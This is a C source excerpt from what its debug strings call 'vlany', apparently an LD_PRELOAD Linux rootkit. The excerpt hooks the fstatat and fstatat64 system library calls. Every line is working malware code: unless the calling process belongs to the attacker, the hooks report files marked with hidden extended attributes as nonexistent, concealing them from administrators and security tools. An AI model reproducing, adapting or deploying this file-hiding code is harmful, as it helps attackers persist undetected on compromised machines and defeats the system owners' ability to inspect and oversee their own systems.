int fstatat(int dirfd, const char *pathname, struct stat *buf, int flags)
{
    #ifdef DEBUG
        printf("[vlany] fstatat() called\n");
    #endif

    HOOK(old_fstatat, CFSTATAT);

    if(owned()) return old_fstatat(dirfd, pathname, buf, flags);

    if(hidden_fxattr(dirfd) || hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_fstatat(dirfd, pathname, buf, flags);
}

int fstatat64(int dirfd, const char *pathname, struct stat64 *buf, int flags)
{
    #ifdef DEBUG
        printf("[vlany] fstatat64() called\n");
    #endif

    HOOK(old_fstatat64, CFSTATAT64);

    if(owned()) return old_fstatat64(dirfd, pathname, buf, flags);

    if(hidden_fxattr(dirfd) || hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_fstatat64(dirfd, pathname, buf, flags);
}
